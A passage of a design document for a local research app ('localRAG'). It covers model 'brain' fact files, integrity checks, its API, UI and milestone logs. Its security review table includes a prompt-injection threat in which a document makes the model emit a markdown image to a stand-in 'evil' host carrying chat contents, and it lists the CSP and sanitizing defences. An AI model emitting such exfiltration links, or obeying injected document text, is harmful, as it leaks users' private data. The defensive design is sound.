different start, a single tool, and a prompt that puts relevant brain facts first:
1. The program calls `organize_brain` first. If there are no facts, or the layout fails
   validation, the brain is left as it is and a warning is raised.
2. It reads the whole brain file into context as Markdown: headings, `[THOUGHT]` lines and
   facts. This is unlike `read_brain`. Only the 64-character hashes are left out, and facts
   that fail integrity are listed as not to be cited. Both of these steps appear to the model
   as its own tool calls.
3. The model then loops with `ask_corpus` only (`propose_fact` and `read_brain` are refused),
   for up to 14 steps.
4. It writes a title and 4–5 paragraphs, citing `[C#]` or fact IDs, which resolve to their
   original sources as in a research run. A report proposes no facts.
- **The prompt asks it to:**
  - decide what an answer to *this* question needs, and use only the facts and thoughts that
    bear on it (most of the brain may be irrelevant);
  - build on those facts first, cited directly as `[F#]`, and not re-ask the corpus for what a
    fact already establishes;
  - use `ask_corpus` only for what the facts leave open;
  - write one connected argument: the direct answer, then the evidence, then the limits, then
    a conclusion. Not a tour of topics.
- **Runs are kept** in `agent_runs` with their `mode` (schema v8). The Report tab lists past
  reports on the left, including running and failed ones. A run whose browser tab was closed
  keeps going and appears when it's done; a run cut off by quitting the app is marked failed
  when the workspace next opens.

**Brain files**
- **One per reasoning model:** `brain/<model>.md` (`deepseek-r1:8b` → `deepseek-r1_8b.md`).
  The header records the exact model name. The queue, registry and embeddings are per model
  too. Per-model brains fit the admission rule "facts the model doesn't already know", which
  differs between models.
- **Line types**

  | Line | Written by | Seen by the model |
  |------|------------|-------------------|
  | `[FACT] …` | Program only: on approval, a merge, or your edit | `read_brain` (compact), `organize_brain` (by ID) |
  | `[THOUGHT] …` | Model via `organize_brain`; you can edit or delete | Only in `organize_brain` |
  | `#` / `##` / `###` headings | Model via `organize_brain`; you can edit | Only in `organize_brain` |
  | Blank | Anyone | n/a |

  Any other line is a validation error. It is shown in Second Brain and ignored when reading.

- **`[FACT]` format:** one line, immutable to the model:

  ```
  [FACT] F-0012 | Self-attention takes O(n²) time and memory in sequence length n. | Vaswani 2017, p. 6 "complexity per layer O(n²·d)" <doc:9c1e…, chunk:4f3a…>
  ```

  - Fields: ID, claim, then one or more citations (label, page, quote, document hash, chunk
    text hash), separated by ` | ` (escaped where needed).
  - Mutable state (status, links, dates) lives in the database, so the line never has to
    change.

- **Example file**

  ```markdown
  # Brain · deepseek-r1:8b

  ## Cost of attention
  [THOUGHT] F-0012 and F-0031 look contradictory but describe different mechanisms:
  [THOUGHT] standard softmax attention vs. kernelized linear attention.
  [FACT] F-0012 | Self-attention takes O(n²) time and memory in sequence length n. | Vaswani 2017, p. 6 "…" <doc:…, chunk:…>
  [FACT] F-0031 | Linear attention reduces the cost to O(n). | Katharopoulos 2020, p. 2 "…" <doc:…, chunk:…>

  ## Unsorted
  [FACT] F-0040 | … | …
  ```

**`read_brain`**
1. Read the selected model's file and keep only lines starting with `[FACT]`. Headings,
   thoughts and anything else are discarded.
2. Parse each line and **resolve it** (§13). Only facts whose ID is registered and `active`,
   and whose citations resolve, pass. Excluded facts raise a context warning.
3. Render compactly. Hashes and quotes are dropped; conflict markers come from `fact_links`:

   ```
   Known facts (verified; cite the original source shown, not the fact ID):
   [F12] Self-attention takes O(n²) time and memory in sequence length. (Vaswani 2017, p. 6)
   [F31] ⚠ conflicts with F12: linear attention reduces the cost to O(n). (Katharopoulos 2020, p. 2)
   ```

4. File order is kept, so `organize_brain`'s grouping still helps.
5. Everything is included if it fits the brain budget (~25% of context). Otherwise the most
   relevant facts are chosen by embedding similarity, and a warning is raised.
6. A fact is never a citation itself. If the model cites `[F12]`, it's replaced by F12's
   original citations; an unresolvable fact ID is flagged like an invalid citation.

**`organize_brain`**
- **Input:** the whole file, with headings and `[THOUGHT]` lines, and each fact shown
  compactly with its ID. The instructions: group facts under headings, reorder them within
  and between sections, and add or revise `[THOUGHT]` lines explaining how the facts relate.
- **Output:** the new layout, with facts referenced only by ID (`[FACT F-0012]`). The program
  substitutes the original lines byte for byte, so fact content can't change, even by a
  copying mistake.
- **Validation** (§13) runs before saving. On failure, the errors go back to the model for one
  retry. If that fails too, the file is left unchanged and the attempt is reported.
- **Saving:** the previous version goes to `.localrag/brain-history/<model>/`. Second Brain
  shows the diff, with **Undo**.
- **Triggers:** the agent calls it, for example after new approvals, or you click **Organize
  brain**.
- Thoughts are the model's interpretation, not verified claims. That's why only
  `organize_brain` shows them to the model.

**Formats at the model boundary**
- **Into the model:** compact text. JSON would cost about a third more tokens for the same
  facts.
- **Out of the model:** JSON (tool arguments and layouts), constrained by Ollama's tool
  calling / JSON-schema output, because the program must parse it.
- **Not BSON:**
  - It's binary, and models emit text tokens.
  - It isn't smaller than JSON for small documents.
  - Ollama doesn't support it.
  - Its database-storage strengths don't apply here.

**Admission rules** (checked before a proposal reaches the queue)
1. **Cited and verified:** the quotes verify, and the strict support check passes.
2. **General and reusable:** the agent records a one-line reason.
3. **Not already known to this model:** a closed-book probe asks the same model without
   sources. If its unaided answer matches, the fact is dropped.
4. **Not previously rejected or deleted:** the proposal is compared to `rejected_facts` by
   embedding similarity, and near matches are dropped. This is what keeps a rejected or
   deleted fact from being proposed again.
5. **Not a duplicate:** a near-duplicate of an active fact becomes a **merge** proposal (adding
   its citation to the existing fact).
6. **Contradictions are kept:** both facts stay, linked as `conflicts`.

**Fact queue**
- Proposals live in `fact_queue` per model, never in the brain file, so a brain holds only
  approved facts.
- Queued facts aren't used in reasoning.
- A queued fact whose source changes is re-verified before it can be approved.
- **Actions** (in the Second Brain sidebar, §15):
  - **Approve:** a new ID is registered and the `[FACT]` line is appended under
    `## Unsorted`.
  - **Edit & approve:** the edited claim is re-verified against its quotes first.
  - **Reject:** recorded in `rejected_facts`.
  - **Merge:** the program rewrites the target fact's line with the extra citation and updates
    `line_sha`.

**Writes and concurrency.** All brain writes go through one per-model lock in `core`. Each
write checks the file's hash against the last version read. If you edited the file in an
editor meanwhile, the write is refused, the file is re-read and re-validated, and the action
is retried or shown to you.

## 13. Reference integrity

Two kinds of reference must always resolve: **fact IDs** (brain files ↔ registry) and
**chunk references** (document hash + chunk text hash in facts, the queue and chat history).

**Fact ID resolution.** `brain_facts` is the registry and source of truth.
- IDs (`F-0001`, …) are assigned by the program, per model, monotonically. They're **never
  reused**: deleted facts stay registered as `deleted` tombstones.
- Checks run on every `read_brain`, every `organize_brain`, every write, and on `localrag
  check`:

  | Check | Failure → result |
  |-------|------------------|
  | Every `[FACT]` line's ID exists in the registry | Unknown ID → excluded, reported |
  | No ID appears twice in the file | Duplicate → all copies excluded until fixed |
  | The line's hash equals the registry `line_sha` | Mismatch (edited outside localrag) → re-validated as a hand edit (quotes re-verified); excluded until it passes |
  | Every `active` registry fact appears in the file | Missing → reported, with **Restore** (re-append the registered line) or **Delete** |
  | `deleted` IDs don't reappear | → excluded, reported |
  | Fact IDs mentioned in `[THOUGHT]` lines exist | Dangling mention → reported (the thought is kept) |

- **`organize_brain` additionally requires:**
  - Every `[FACT <id>]` placeholder resolves to an active fact.
  - Every active fact appears exactly once.
  - Every other line is a heading, a `[THOUGHT]` line or blank.
  - `[THOUGHT]` lines contain no `[FACT]` markers and no unknown IDs.
  - As a final guard, the multiset of fact lines is identical before and after.

**Chunk reference resolution.** Each citation `<doc:sha256, chunk:text_sha>` plus its quote is
resolved against the index, in order:

| Result | Condition | Effect |
|--------|-----------|--------|
| `resolved` | The document with that hash is `indexed`, contains a chunk with that `text_sha`, and the quote verifies in it | OK |
| `relocated` | The document changed (new hash), but a chunk with the same `text_sha` exists and the quote verifies | OK. The new location is recorded in `fact_citations.resolved_chunk_id`; the `[FACT]` line is untouched |
| `source_removed` | The document is `removed` (chunks retained) | Fact `stale`: excluded from `read_brain` until the file returns |
| `broken` | The document was forgotten, or no chunk contains the quote | Fact `broken`: excluded and listed in Second Brain with **Find quote** (search the corpus for the quote, then re-anchor on approval) or **Delete** |

- **When it runs:**
  - After each index sync, only for facts citing documents that changed, were removed or
    were forgotten. This makes it incremental, like indexing.
  - On every `read_brain` (cheap: indexed hash lookups).
  - Before approving or merging queue items.
  - On demand with `localrag check` or the **Re-check** button.
- **Chat history:** citation snapshots resolve with the same rules, and the UI shows
  *resolved / file removed / forgotten* on each citation chip. Old answers stay readable from
  the snapshot either way.
- `localrag check` reports all failures across brains, the queue and chat history, and exits
  non-zero if any exist, so it can run in tests.

## 14. Server, API & security

**Security review (2026-10-31).** Findings, and what changed:

| Area | Risk | Status |
|------|------|--------|
| Workspace in a git repo | `.localrag/` holds `index.db` (chat history, extracted text of every document), OCR text, eval logs and settings. Before, it was only ignored if a repo already existed at `init` | **Fixed:** `.localrag/.gitignore` with `*` ignores it in any repo, now or later |
| Email / API keys in a repo | — | **Safe by design:** the Crossref email lives in the global `~/.config/localrag/config.toml`, never in a workspace. Future API keys go in the **macOS Keychain**, never a config file; no secret is ever read from workspace config |
| Global config readable by others | Email, known workspace paths, launch token | **Fixed:** `~/.config/localrag/` is 0700; its files are 0600 and written atomically |
| `corpus/` in a public repo | Papers may be copyrighted or private | **Fixed:** `corpus/.gitignore` (`*`) ignores the documents by default; delete it to version them deliberately |
| `brain/` in a public repo | Brain files quote documents | `brain/.gitignore` with `*` is written with the first brain file, like `corpus/` (delete it to version brains) |
| CSRF / DNS rebinding | Websites driving the local API | Host check, Origin check, per-launch token in an HttpOnly SameSite=Strict per-port cookie |
| Prompt injection exfiltrating data | A document tells the model to emit `![](https://evil/?q=<chat>)` | CSP `img-src 'self' data: blob:` and `connect-src 'self'` block remote loads; model output goes through DOMPurify |
| Malicious PDFs | PDF.js font-code execution (CVE-2024-4367 class); PDFium memory bugs | PDF.js 4.10.38 with `isEvalSupported: false`. **PDFium runs only in `localrag-pdf`, a helper process started per request under `sandbox-exec`** (no network, no file writes; verified). A crash comes back as "the PDF parser crashed on this file (signal N)", a hang is killed after a timeout, and either way only that file is marked failed. The server process never loads PDFium |
| Uploaded files rendered as HTML | A `.txt` full of `<script>` | Served as `text/plain` with `X-Content-Type-Options: nosniff`, by document id only |
| Clickjacking / referrer leaks | — | `X-Frame-Options: DENY`, `frame-ancestors 'none'`, `Referrer-Policy: no-referrer`, `Cache-Control: no-store` on data |
| Upload abuse | Path traversal, huge bodies, half-written files | Basename only (no `/`, `\`, leading dot); extension allowlist; parse before write; atomic rename with unique temp names; size cap |
| Token exposure | The launch URL lands in browser history and the terminal | Residual: the token changes on every launch and only works on localhost |
| This source repository | Personal data committed by accident | Scanned all tracked files and full history: no emails, tokens or keys. Machine-specific test config (`.claude/launch.json`) is excluded locally |

**Request guard.** Binding to `127.0.0.1` isn't enough. Any website in your browser can send
requests to localhost (CSRF), and DNS rebinding can get around same-origin rules. So:
- Only accept a `Host` of `127.0.0.1:<port>` or `localhost:<port>`.
- Require a random per-launch token on every `/api` call. The launch URL sets it as a cookie.
- Reject foreign `Origin` headers, and send no CORS headers.
- Model output is rendered through `marked` + `DOMPurify`, since document text (possibly
  containing HTML or injected instructions) reaches the page through the model.

The server picks a free port and opens the browser on start.

| Endpoint | Purpose |
|----------|---------|
| `GET /api/status` | Counts, indexing/OCR progress, Ollama reachable |
| `GET /api/models` | Chat-capable models, defaults, `num_ctx` per model |
| `GET/PUT /api/settings` | Global settings incl. `crossref_email` |
| `POST /api/search` | Retrieval only |
| `POST /api/ask` | Budget check (`413` "Over token count by X"), then SSE: `sources` → `context_warning` → `thinking`/`token` → `answer` |
| `GET /api/documents[/{id}]` | Documents tab listing and details |
| `GET /api/documents/{id}/references` | Bibliography entries for the References hover |
| `PATCH /api/documents/{id}` | Edit metadata; confirm/reject a proposed Crossref match |
| `POST /api/documents/{id}/metadata/refresh` | Re-query Crossref |
| `POST /api/documents/{id}/ocr` | Start OCR |
| `DELETE /api/documents/{id}` | Forget (removed documents only) |
| `GET /api/chunks/{id}` | Chunk + neighbors |
| `GET /api/highlights?doc=&page=&start=&end=` | Rectangles for a span |
| `GET /files/{doc_id}` | Original file, by ID only |
| `POST /api/reindex` | Sync now |
| `/api/sessions…` | Chat history |
| `GET /api/brain/models` | Reasoning models + which have brain files |
| `GET /api/brain/{model}` | Parsed brain (headings, thoughts, facts with statuses) + integrity report + file hash |
| `PATCH/DELETE /api/brain/{model}/lines/{n}` | Edit/delete a thought or heading (`If-Match: <file hash>`) |
| `PATCH/DELETE /api/brain/{model}/facts/{id}` | Edit (re-verified) / delete (→ rejected) a fact (`If-Match`) |
| `POST /api/brain/{model}/facts/{id}/restore` | Re-append a registered fact missing from the file |
| `POST /api/brain/{model}/organize` · `/undo` | Organize, undo the last saved change (re-check = `GET` again) |
| `GET /api/brain/{model}/last-change` | Previous and current file, for the diff |
| `GET /api/brain/{model}/queue` | Proposed facts |
| `POST /api/brain/{model}/queue/{id}/{approve\|reject\|merge}` | Queue actions (`approve` accepts an edited claim) |
| `POST /api/agent/run` | Run the reasoning agent (`mode`: `research` or `report`); SSE: `step`, `thinking`, `token`, `tool_call`, `tool_result`, `brain_update`, `warning`, `result` |

## 15. User interface

One page with five tabs (in order: Search, Ask, Documents, Research, Report), the
workspace menu, a Settings panel, and first-load dialogs.

- **First load:**
  - **Workspace picker**, when no workspace is active. It lists known workspaces (Open, or ×
    to drop one from the list without touching the folder), **Open another folder…**, and
    **New workspace**.
  - **New workspace** takes a location chosen with **Choose…** (the native macOS folder
    chooser; the field can't be typed into) and a folder name. A non-empty existing folder is
    never overwritten.
  - If no workspaces are known, the dialog opens on "Create your first workspace". It can't
    be dismissed until a workspace is open.
  - Then the Crossref email dialog, if no email is set (§7).
- **Workspace menu** (labelled with the open workspace's name, top left next to localRAG):
  New workspace…, Open workspace…, and up to 6 recent workspaces (the active one ticked).
  Switching resets every tab to the new workspace.
- **Ask:**
  - Chat with a model dropdown and session list.
  - An over-budget Submit shows "Over token count by X tokens".
  - Answers show context-overload banners, flagged sentences, and citation chips
    `[Smith 2021, p. 12]` marked ✓ verified, ≈ verified paraphrase or ⚠ unverified.
  - A chip opens a side panel with the chunk, the highlight (§10: the quote when verified,
    the whole chunk otherwise) and **Open at p. 12** (PDF.js with the same highlight).
    Unverified chips have **Mark as verified paraphrase**; promoted ones have **Undo**.
- **Search:** ranked passages, filterable by document or year.
- **Documents** (called Library before 2026-11-01):
  - **Add documents…** (multiple files):
    - Only `.pdf`, `.md`, `.markdown`, `.txt`; anything else is refused naming the accepted
      types.
    - Each file is parsed exactly as indexing will before it's written to `corpus/`, and
      refused with the reason if parsing fails: no PDF header (renamed file), damaged PDF,
      password-protected, the byte offset and line of invalid UTF-8, empty, or no text and no
      scanned pages. Files over `max_file_mb` are refused too.
    - Accepted files are written atomically (hidden temp name, then rename). Name clashes
      become `name (2).pdf`. The file reports its pages and any scanned pages.
    - **Indexing is manual:** it starts only from an upload or **Reindex**. Nothing watches
      `corpus/`, and opening a workspace doesn't sync it, so files added in Finder appear after
      **Reindex**. The UI uploads a batch with `sync=false` and then starts one sync for all of
      it (tested); a plain API upload indexes by itself.
  - **Rename** (any document still in `corpus/`):
    - Edits the name inline. The extension is shown as a fixed suffix, because changing the
      type would mean reindexing.
    - The file is renamed in place and nothing is reindexed: content, hash, chunks and vectors
      are unchanged, and the next sync sees nothing to do.
    - Updated in one transaction:
      - the document's path
      - chat-history citation snapshots for that path (their labels too, when the label came
        from the file name)
      - `eval.jsonl` questions whose `expected_doc` matched only the old name
    - Refused while indexing runs, for a name that's taken, or a changed extension.
  - Documents with status and metadata source.
  - Actions: Run OCR, Forget (removed only, confirmed), Forget all removed, edit metadata,
    confirm/reject a Crossref match, refresh metadata, reindex.
- **Report:** a sidebar of past reports (New report, delete); a research question, a
  reasoning-model picker and **Generate Report**. The steps and the model's reasoning stream
  live (the reasoning collapses once the report arrives), then the report with source chips.
- **Research** (called Second Brain until 2026-11-01; Phase 7):
  - **Reasoning model selector** (installed models with `thinking` + `tools`). Models that have
    a brain file but are no longer installed appear read-only.
  - **Main pane:** the selected model's accepted facts, in the brain's current structure. A
    **Research a question** box at the top, with a **Research** button, runs the agent and
    streams its steps (tool calls, dropped or queued proposals) and its cited answer.
    - Headings, `[THOUGHT]` lines (styled as interpretation) and facts: the claim, citation
      chips that open the highlighted source, and a status badge (active / stale / broken /
      unresolved).
    - **Thoughts:** edit inline, or delete.
    - **Facts:** edit the claim; quotes are re-verified and must pass before the program
      rewrites the line. Delete is confirmed, the line is removed, the ID tombstoned, and the
      fact recorded as rejected so it isn't proposed again.
    - An **integrity banner** shows unresolved IDs and broken references, with Re-check,
      Restore, Find quote and Delete actions.
    - **Organize brain** and **Undo**, with a diff of the last reorganization.
  - **Sidebar: Proposed Facts** for the selected model. Each card shows the claim,
    highlighted quotes, the agent's reason, and near-duplicate or conflicting facts. Actions:
    **Approve**, **Edit & approve**, **Reject**, **Merge** (pick the target fact; its line is
    previewed).
- **Settings:** Crossref email, default chat model, `num_ctx` per model, OCR mode.

## 16. Code layout

```
localRAG/
├── Cargo.toml                    # workspace
├── crates/
│   ├── core/                     # no HTTP; shared by CLI, server, app, agent
│   │   └── src/
│   │       ├── workspace.rs      # find .localrag/, config merge, ignore rules
│   │       ├── db.rs             # connection, sqlite-vec, schema, migrations, triggers
│   │       ├── scan.rs           # walk corpus/, fingerprint, diff, statuses
│   │       ├── parse/            # pdf.rs (PDFium), markdown.rs, text.rs
│   │       ├── ocr.rs            # Vision + cache
│   │       ├── metadata/         # crossref.rs, ratelimit.rs, doi.rs, pdfmeta.rs, cite_label.rs
│   │       ├── chunk.rs
│   │       ├── embed.rs
│   │       ├── retrieval.rs      # bm25, vector, fusion, diversity, expansion
│   │       ├── budget.rs         # token counting, budget, warnings
│   │       ├── llm.rs            # Ollama: models, chat stream, num_ctx, think, pull
│   │       ├── answer.rs         # RagEngine::ask(): gate → generate → verify → Answer
│   │       ├── highlight.rs      # span → character boxes
│   │       ├── refs.rs           # chunk-reference resolution (§13)
│   │       ├── brain/            # file.rs (parse/render/write+lock), registry.rs, queue.rs, organize.rs, integrity.rs
│   │       └── agent.rs          # reasoning loop + tools (Phase 7)
│   ├── server/                   # axum routes, SSE, token auth, embedded web assets
│   ├── cli/                      # `localrag`: init, index, serve, search, ask, status, forget, check, eval, doctor, config
│   └── app/                      # Tauri shell (Phase 6)
├── web/                          # index.html, app.js, style.css, vendor/{marked,dompurify,pdfjs}
├── scripts/fetch-pdfium.sh       # prebuilt PDFium for aarch64-apple-darwin (not committed)
└── tests/fixtures/               # small PDFs (text + scanned), .md, .txt, sample brains
```

Rule: `core` knows nothing about HTTP. The server, CLI, app and agent are thin shells over it.

## 17. Testing & evaluation

- **Unit and integration tests:**
  - Change detection: touch, edit, rename, remove → restore, forget, embedding-model switch.
  - No FTS/vector orphans after cascaded deletes.
  - Page labels; offsets → character boxes.
  - Quote verification, including OCR fuzz; citation parsing.
  - Budget math and the "over by X" figure; every warning trigger, including detected Ollama
    truncation.
  - Crossref limiter on a mock server with a simulated clock: never exceeds either pool's rate
    or concurrency, honors `Retry-After` and stricter headers, switches pools when the email
    changes.
  - Brain parsing and every integrity check in §13. Fixtures cover unknown, duplicate,
    missing, edited and tombstoned IDs, and relocated, removed and broken chunks.
  - `organize_brain` validation: rejects dropped, duplicated or unknown IDs and altered lines.
    Property test: any accepted output has an identical multiset of fact lines.
  - Queue actions; rejected and deleted facts are never re-proposed; write lock and
    stale-hash refusal.
- **Retrieval eval:** `eval.jsonl` `{question, expected_doc, expected_pages}`; recall@5 and
  recall@10. Used to tune chunk size, k, fusion and the gate.
- **Grounding eval:** refusal rate on unanswerable questions; quote-verification rate and
  citation precision on answerable ones; model comparisons (e.g. `qwen3.5:4b` vs `9b`).
- **Commands:** `localrag eval` runs both evals; `localrag check` runs the integrity checks.

## 18. Milestones

**Phase 0: spikes & scaffold**
- Cargo workspace, `clap` skeleton, `localrag doctor`.
- PDFium: text, character boxes and page labels; render a page. Vision OCR of a rendered page.
- `rusqlite` + FTS5 + `sqlite-vec` statically linked; triggers on cascaded deletes.
- `ollama pull qwen3-embedding:0.6b`; confirm 1024 dimensions and the query template; chat
  with explicit `num_ctx`.
- `tokenizers` counts vs `prompt_eval_count`.
- One Crossref DOI lookup and one query, with `mailto`.
- *Exit:* `doctor` all green.
- **Done (2026-10-31):** `localrag doctor` passes all 8 checks on the M2. Findings:
  - **Versions:** SQLite 3.53.2 with FTS5, sqlite-vec 0.1.9, and PDFium chromium/7881 (fetched
    by `scripts/fetch-pdfium.sh`).
  - **PDFium:** page labels `345`/`346` are read from `/PageLabels`.
  - **Vision:** OCR of a 300 DPI render reads every line correctly.
  - **Embedding:** `qwen3-embedding:0.6b` gives 1024 dimensions, and the query instruction
    ranks the relevant passage first (0.76 vs 0.22).
  - **Context size:** Ollama loads `qwen3.5:4b` at exactly the requested `num_ctx` (verified
    via `/api/ps`).
  - **Token counts:** the Hugging Face Qwen3.5 tokenizer matches Ollama exactly (43 = 43, raw
    prompt), so exact pre-counting works for Qwen models.
  - **Crossref:** the public pool reports `X-Rate-Limit-Limit: 5` per `1s`, matching §7.

**Phase 1: workspace & stateful indexing (CLI)**
- `init`, config, `corpus/`, ignore rules; scan/diff; all statuses; restore; `forget`.
- PDF/MD/TXT parsing, chunking, embedding; `index`, `status`.
- *Exit:* a second run reports 0 changed in about a second; touching one file affects only
  that file.
- **Done (2026-10-31):** commands `init`, `index`, `status [--docs]` and
  `forget <doc> | --all-removed`. 15 tests (5 unit, 10 integration) cover the exit criteria
  and the PDF path.
  - **Real run:** 3 Zotero PDFs plus 300 notes indexed in 49 s (375 chunks, real embeddings).
    The second run took **13 ms**. Printed page labels come through (e.g. pp. 1996–2005).
  - **Single-file changes:** an edit, a touch, a removal, and a restore under a new name each
    touched only that file.
  - **Deviations from the plan:**
    - The chunker is custom rather than `text-splitter`, because it has to track
      page/section/char offsets per sentence.
    - Markdown uses a line-based heading parser rather than `pulldown-cmark`; it keeps exact
      line and offset bookkeeping, and fenced code is never read as a heading.
    - Token counts while chunking are estimated (about 4 chars per token).
  - **PDF metadata:** no year is taken from PDF metadata, because a PDF's creation date isn't
    its publication date.
  - **Environment errors abort the sync** (Ollama down, PDFium missing). Only problems with the
    file itself are recorded as `failed`, so a file never gets stuck as failed because of the
    environment.

**Phase 2: retrieval & grounded answers (CLI)**
- Hybrid search (`search`); budget check and warnings; prompting; quote verification;
  "I don't know" (`ask`).
- Chat-history citation snapshots; first eval set; `eval`; `check` for chat-history
  references.
- *Exit:* correct pages and verified quotes on the eval; a recorded baseline refusal rate.
- **Done (2026-10-31):** new commands `search`, `ask` (`-c`/`--session` to continue a chat,
  `--json`), `check` and `eval [--retrieval-only]`. Chat history is stored per workspace with
  citation snapshots. 33 tests pass (16 unit, 17 integration), including the answer pipeline
  against a scripted LLM.
  - **Baseline** (`qwen3.5:4b`, num_ctx 16,384; 3 PDFs; 13 answerable + 4 unanswerable
    questions):

    | Metric | Result |
    |--------|--------|
    | Document recall@5 / @10 | 100% / 100% |
    | Page recall@5 / @10 | 92% / 100% |
    | Answerable questions with a verified citation ("supported") | 85% (11/13) |
    | Unanswerable questions refused | **100%** (4/4) |
    | Citations whose quote was found verbatim in the source | 67% |
    | Citations pointing at the expected document | 100% |

  - **Prompt fixes that raised "supported" from 69% to 85%:**
    - A worked example in the system prompt.
    - A rule that citations must carry a quote.
    - Accepting `[S1] "quote"` as well as `[S1 "quote"]`.
  - **The similarity gate only catches off-topic questions.** Off-topic questions score
    0.18–0.22; on-topic unanswerable ones score 0.57–0.64, which overlaps answerable ones
    (lowest 0.58). On-topic refusals therefore depend on the model's `INSUFFICIENT:` reply,
    which worked 4/4. `min_similarity` stays at 0.45.
  - **Retrieval:** the per-document cap is soft. Each paper gets at most 3 chunks at the top,
    and the rest backfill. A hard cap had cost page recall.
  - **Quotes:** the final word may be cut short ("commonly use" matches "commonly used").
  - **Phase 5 follow-ups:**
    - Raise quote verification (67%); most failures are paraphrased quotes.
    - Grow the eval set beyond 17 questions before tuning anything else.

**Phase 3: web app**
- axum, token auth, SSE; Ask / Search / Library; model dropdown; over-budget error; warning
  banners; chat history; PDF.js with highlights; `serve`.
- *Exit:* the full loop in the browser across two workspaces, with no state leaking.
- **Done (2026-10-31):** `localrag serve [--port 8765] [--no-open] [-C dir]` syncs in the
  background, serves the UI, and opens the browser on the launch URL that carries the token.
  - **What was tested** (in the browser, two workspaces at once on ports 8765/8766):
    - Ask, with streaming, citation chips, the inspector and promoting a paraphrase.
    - The PDF.js viewer, with rectangles exactly over the cited text, across pages.
    - The Markdown viewer, Search, and Library remove/reindex.
    - The over-budget error.
  - **Security:**
    - Host check, Origin check, and a per-launch token traded for an HttpOnly, SameSite=Strict
      cookie.
    - A CSP that allows scripts only from the app itself.
  - 50 tests pass. New ones cover the auth guard, paraphrase promotion, and highlight mapping
    (PDF rectangles, text offsets, changed files).
  - **Bugs the two-workspace test caught:**
    - Cookies are per host, not per port, so the token cookie is now `localrag_token_<port>`.
      Before that, opening a second workspace logged out the first.
    - Chat history from before citation ordinals existed now gets them backfilled when read.
  - **Highlighting:** spans map to PDFium character boxes through the same normalization the
    chunker uses (whitespace, hyphenation, `\r\n`), so rectangles match the cited text
    exactly. They are merged per line. The viewer scrolls to the topmost one, because PDF
    text order puts footers first.
  - **Follow-up (same day): one instance, workspace picker, uploads, security review.**
    - Single-instance lock; workspace menu; picker and creation flow; Library uploads with
      detailed parse errors (§4, §15); the security review above. 48 tests pass.
    - Bug found by the browser test: two connections opening a brand-new database raced to
      create the schema. The migration now takes SQLite's write lock (`BEGIN IMMEDIATE`) and
      re-reads the version.
  - **Follow-up 2:**
    - PDF helper process with sandbox. `doctor` now checks parsing, character boxes and
      rendering through it.
    - Self-ignoring `corpus/`; a location that can only be chosen; Rename without reindex.
    - 50 tests pass.
    - Bug found: switching a brand-new database to WAL could return "database is locked"
      under concurrent opens without waiting; the open sequence now retries busy errors
      briefly.
  - **Not yet:**
    - The Settings panel and Crossref email dialog (Phase 4).
    - Search filters by document or year (need Phase 4 metadata).
    - Suggestions and uncited-sentence lists aren't stored in chat history, so reopened chats
      don't show them.

**Phase 4: metadata & OCR**
- DOI extraction; Crossref client (limiter, cache, background queue); page labels;
  `[Author Year, p. N]`.
- Email dialog and Settings; proposed-match review; manual edits.
- Vision OCR with cache, Run OCR and progress.

- **Done (2026-10-31):**
  - **Crossref client:**
    - Two limiters (single-record and list), each a no-burst spacing limiter with a
      concurrency cap, set to the polite or public pool depending on the email.
    - Stricter `X-Rate-Limit-*` / `X-Concurrency-Limit` headers tighten them; live Crossref
      sends `x-concurrency-limit: 1` on the public pool.
    - `Retry-After` / exponential backoff on 429 and 5xx; responses cached in
      `~/.cache/localrag/crossref/`.
    - Tested with a simulated clock (no one-second window exceeds the rate) and against a mock
      server.
    - Bug the simulated-clock test caught: rounding the spacing *down* let 4 requests into one
      second at 3/s. It's now rounded up.
  - **Matching:** DOI from the text first (including DOIs PDF line-wrapping splits after the
    `/`), else a bibliographic query from the title (PDF metadata if plausible, else a
    Zotero-style file name) plus the opening text.
    - Score: 0.7 × title similarity + author + year.
    - ≥ 0.85 → matched; ≥ 0.45 → *proposed* (candidates kept for review); else unmatched.
    - **Real run on the 3 PDFs: all matched** (Niemann by a wrapped DOI, the others by title).
  - **Labels:** `cite_label` is recomputed after every sync, metadata change and rename, with
    a/b suffixes for collisions.
  - **Printed pages:** from the metadata's `page` range when the PDF has no page labels and
    its page count fits (one extra page allowed for a cover sheet). Article-number journals
    like Baicry's and Niemann's correctly get none.
  - **Manual edits** (Documents → metadata badge) are never overwritten by lookups.
  - **Settings & email:** the first-load email dialog (validated, or Skip for the public pool)
    and a Settings dialog (email, default model, `num_ctx`, OCR mode). CLI:
    `localrag config get|set|unset`, `localrag metadata [--refresh]`; `index` looks up new
    documents' metadata unless `--no-metadata`.
  - **OCR:**
    - The sandboxed helper renders each scanned page at ~300 DPI, and Vision recognizes it
      in-process (Apple's code on the helper's PNG).
    - Lines are ordered and grouped into paragraphs by vertical gaps, cached per file hash
      (saved after each page, so a cancelled run resumes), and merged into the parse at index
      time.
    - **Run OCR** and **Run OCR on all** in the Documents tab, `ocr = "auto"` after syncs, Cancel,
      progress in the status bar; CLI `localrag ocr`.
    - Citations from OCR text carry an **OCR** badge. Highlights on scanned pages come from
      Vision's line boxes, trimmed by character position (checked in the browser: the quote
      lights up on the scanned image).
  - 62 tests pass.
  - **Not yet:** search filters by document or year (now possible with metadata; small,
    Phase 5); bibliography export (later).

**Phase 5: quality & polish**
- File watcher, strict mode, quote repair, search filters (follow-up rewriting shipped in
  Phase 2).
- Tune the gate, k and chunk size against the eval.
- **Batch embeddings across files: measured, not worth it (2026-10-31).** Cross-file batching
  was built and benchmarked on the 3 PDFs + 300 notes: 50 s, versus 49 s without.
  - Tracing showed that the 300 tiny notes take ~1 s per 32. Almost all the time is the
    ~75 PDF chunks (~480 tokens each).
  - Direct `/api/embed` measurements on real chunks: 32 at once, 4×8, 8×4 and 32×1 all take
    ~15 s for ~18,700 tokens. So `qwen3-embedding:0.6b` under Ollama on the M2 is
    **compute-bound at ~1,250 tokens/s**, and round trips don't matter. The change was
    reverted.
  - **What this means:** the first index of a large corpus takes a while. Each ~500-token
    chunk costs ~0.4 s, so 100 papers × 60 chunks is about 40 minutes; after that, syncs are
    incremental. A faster embedding model (e.g. `embeddinggemma`, `nomic-embed-text`) trades
    retrieval quality for speed. Measure with `localrag eval` before switching, since
    switching re-embeds everything.

- **Done (2026-11-01):**
  - **File watcher:** `corpus/` of the active workspace was watched (FSEvents, 1.5 s
    debounce). *Removed later the same day: indexing is manual (§15).*
  - **Chat history keeps everything an answer showed** (schema v4): suggestions, uncited
    sentences, invalid citations, not-found state, closest material.
  - **Search filters:** a document and a year range (from metadata; documents without a year
    are excluded once a range is set).
  - **Quote repair (on by default):**
    - For a citation whose quote isn't in its source, one short request asks the model to
